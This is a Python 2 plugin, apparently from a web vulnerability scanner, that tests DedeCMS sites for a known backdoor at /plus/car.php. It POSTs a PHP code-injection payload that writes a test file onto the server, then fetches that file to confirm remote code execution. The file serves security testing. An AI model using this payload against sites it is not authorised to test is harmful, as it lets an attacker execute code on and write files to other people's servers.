#!/usr/bin/python
# -*- coding: utf-8 -*-
import logging
import urllib2
import re
import urlparse
from lib.common import *


def GetTrueUrl(url):
    try:
        parse=urlparse.urlparse(url)
        urls=parse.path
        if urls=="" or urls=="/":
            return url
        urls=url.split("/")
        urls=urls[len(urls)-1]
        if urls=="" or urls.find(".")<0:
            return  url
        else:
            return False     
    except Exception,e:
            logging.getLogger().error(" GetTrueUrl Exception(DirectoryTraversal.py):" + str(e))
            return False

def run_url(http,ob,item):
    try:
        list = []
        url = GetTrueUrl(item['url'])
        if url:
            expurl="%s%s"%(url,"/plus/car.php")
            expurl1="%s%s"%(url,"/plus/NVS_TEST.PHP")
            data="$a=${@file_put_contents(\"NVS_TEST.php\",\"<?php echo \"NVS_TEST_GO\"; ?>\")};"
            headers={"Host": ob['domain'],"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded"}
#           res, content = http.request(expurl,"POST",data,headers)
            res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
#           r, c = http.request(expurl1)
            r, c = yx_httplib2_request(http,expurl1)
            if c.find("NVS_TEST_GO")>=0 and r['status']=='200':
                request=postRequest(expurl,"POST",data,headers)
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],"",request,response))
                return list

    except Exception,e:
        logging.getLogger().error("File:DEDECMSbackdoorscript.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'] + ", url:" + item['url'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:DEDECMSbackdoorscript.py, run_url function :" + str(e)+ ", url:" + item['url'])
        return list
    #ene  try
#end def




